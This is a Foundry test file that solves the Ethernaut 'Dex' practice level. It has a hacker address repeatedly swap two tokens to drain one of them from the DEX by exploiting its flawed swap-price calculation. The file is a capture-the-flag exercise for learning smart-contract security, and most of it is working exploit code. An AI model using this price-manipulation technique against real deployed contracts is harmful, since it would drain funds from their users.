// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Dex/Dex.sol";
import "../src/Dex/DexFactory.sol";
import "../src/Ethernaut.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    Ethernaut private _ethernaut;
    DexFactory private _dexFactory;
    Dex private _dex;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_dexFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_dexFactory);
        _dex = Dex(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(payable(address(_dex)));
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _dexFactory = new DexFactory();
    }

    function testDexHack() public testWrapper {
        address token1 = _dex.token1();
        address token2 = _dex.token2();
        uint256 amountToken1;
        uint256 amountToken2;
        _dex.approve(address(_dex), type(uint256).max);

        IERC20(token1).approve(address(_dex), type(uint256).max);
        IERC20(token2).approve(address(_dex), type(uint256).max);

        while (IERC20(token1).balanceOf(address(_dex)) > 0) {
            _dex.swap(token1, token2, IERC20(token1).balanceOf(_hacker));
            amountToken1 = _dex.get_swap_price(
                token2,
                token1,
                IERC20(token2).balanceOf(_hacker)
            );

            // console2.log(
            //     "dex token1 amount=%s",
            //     IERC20(token1).balanceOf(address(_dex))
            // );
            // console2.log(
            //     "dex token2 amount=%s",
            //     IERC20(token2).balanceOf(address(_dex))
            // );
            // console2.log(
            //     "hacker token1 amount=%s",
            //     IERC20(token1).balanceOf((_hacker))
            // );
            // console2.log(
            //     "hacker token2 amount=%s",
            //     IERC20(token2).balanceOf((_hacker))
            // );
            // console2.log("amountToken1=%s", amountToken1);
            amountToken1 > IERC20(token1).balanceOf(address(_dex))
                ? amountToken2 = _dex.get_swap_price(
                    token1,
                    token2,
                    IERC20(token1).balanceOf(address(_dex))
                )
                : amountToken2 = IERC20(token2).balanceOf(_hacker);

            // console2.log("amountToken2=%s", amountToken2);
            _dex.swap(token2, token1, amountToken2);
        }
    }
}
